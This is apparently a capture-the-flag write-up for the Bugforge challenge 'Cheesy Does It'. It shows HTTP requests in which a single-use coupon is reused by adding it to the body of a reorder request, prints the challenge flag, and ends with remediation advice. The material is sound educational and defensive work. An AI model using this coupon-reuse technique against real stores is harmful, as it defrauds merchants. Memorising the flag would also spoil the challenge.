# Cheesy Does It — cheesy-010 — Reorder some food.

## Challenge Overview

- **Platform:** Bugforge
- **Challenge:** Cheesy Does It
- **Category:** Web Security
- **Difficulty:** As provided by the platform
- **Hint:** Reorder some food
- **Vulnerability:** Coupon reuse through a business-logic flaw
- **Status:** Solved

## Objective

Investigate the application's food-ordering and reorder functionality to identify a business-logic vulnerability and retrieve the challenge flag.

## Tools Used

- Firefox Developer Tools
- Burp Suite — Proxy / HTTP history
- Burp Suite — Repeater

## Step 1: Register an Account

Registered a new test user and inspected the welcome page.

The application displayed a promotional message offering **20% off the first order** using the coupon code:

```text
FOUNDERS20
```

The promotion stated that the coupon could be used only once per customer.

This suggested that coupon eligibility and redemption tracking could be relevant to the challenge.

## Step 2: Apply the Coupon

Added a pizza to the cart and applied the promotional code.

### Request

```http
POST /api/coupons/apply
Content-Type: application/json
```

```json
{
  "code": "FOUNDERS20",
  "subtotal": 10.99
}
```

### Response

```json
{
  "code": "FOUNDERS20",
  "discount_type": "percent",
  "discount_value": 20,
  "discount_amount": 2.2
}
```

The application calculated a 20% discount of $2.20 on the $10.99 subtotal.

## Step 3: Place the First Order

Placed the order with the coupon applied.

### Request

```http
POST /api/orders
Content-Type: application/json
```

The request included the following relevant fields:

```json
{
  "coupon_code": "FOUNDERS20",
  "points_to_use": 0
}
```

The remaining fields contained the cart items, delivery details, and payment information.

### Response

```json
{
  "id": 1,
  "message": "Order created successfully",
  "status": "received",
  "subtotal": 10.99,
  "coupon_discount": 2.2,
  "points_used": 0,
  "points_earned": 8,
  "total": 8.79
}
```

The first order was successfully created with the expected discount.

## Step 4: Investigate the Reorder Functionality

Navigated to the Orders page and selected the option to reorder the previously placed order.

The browser generated this request:

```http
POST /api/orders/1/reorder
```

Initially, the request did not contain a JSON body.

### Initial response

```json
{
  "id": 2,
  "message": "Reorder placed successfully",
  "status": "received",
  "subtotal": 10.99,
  "coupon_code": null,
  "coupon_discount": 0,
  "coupon_reused": false,
  "points_earned": 10,
  "total": 10.99
}
```

The reorder was created without the original coupon.

Because the hint mentioned reordering food, this endpoint became the primary target for further testing.

## Step 5: Test Coupon Reuse

Modified the reorder request in Burp Repeater to include the previously used coupon.

An important detail was to include the correct `Content-Type` header so that the JSON request body could be parsed.

### Modified request

```http
POST /api/orders/1/reorder
Content-Type: application/json
Authorization: Bearer <your-session-token>
```

```json
{
  "coupon_code": "FOUNDERS20"
}
```

The authorization header represents the current authenticated session. Never publish a real session token in a public write-up.

### Successful response

```json
{
  "id": 4,
  "message": "Reorder placed successfully — promo applied",
  "status": "received",
  "subtotal": 10.99,
  "coupon_code": "FOUNDERS20",
  "coupon_discount": 2.2,
  "coupon_reused": true,
  "points_earned": 8,
  "total": 8.79,
  "flag": "bug{q9ohvwjrRriquTVm3eStQr4}"
}
```

The server applied the coupon again and returned the challenge flag.

## Vulnerability Analysis

The challenge demonstrates a **coupon reuse business-logic vulnerability**.

The application advertised the coupon as valid for one use per customer. However, after the initial redemption, the reorder endpoint accepted the same coupon when it was supplied explicitly in the JSON body.

The observed behavior was:

| Scenario | Coupon applied? |
|---|---|
| First order using `FOUNDERS20` | Yes |
| Reorder without a coupon in the body | No |
| Reorder with `coupon_code` and valid JSON content type | Yes |

The response field `"coupon_reused": true` confirms that the coupon was reused.

The exact implementation defect cannot be established from the HTTP responses alone. The backend may have omitted a redemption check, incorrectly evaluated eligibility, or used inconsistent validation between checkout and reorder.

## Root Cause and Remediation

The backend should enforce promotional eligibility independently of the client request.

Recommended fixes:

1. Validate coupon eligibility on the server for every order-creation path, including reorders.
2. Track coupon redemption against the authenticated customer, not just the request or order.
3. Reject a coupon if the customer has already redeemed a single-use promotion.
4. Recalculate discounts and totals on the server rather than trusting client-supplied values.
5. Apply consistent coupon validation across checkout, reorder, and other purchase endpoints.
6. Add automated tests that attempt to redeem the same single-use coupon through different endpoints.

## Flag

```text
bug{q9ohvwjrRriquTVm3eStQr4}
```

## Key Takeaway

A security-sensitive business rule must be enforced on the server across every workflow that can create an order.

Testing alternate endpoints and modifying request bodies revealed that the reorder workflow handled coupon eligibility differently from the initial checkout flow, allowing the challenge's single-use promotion to be applied again.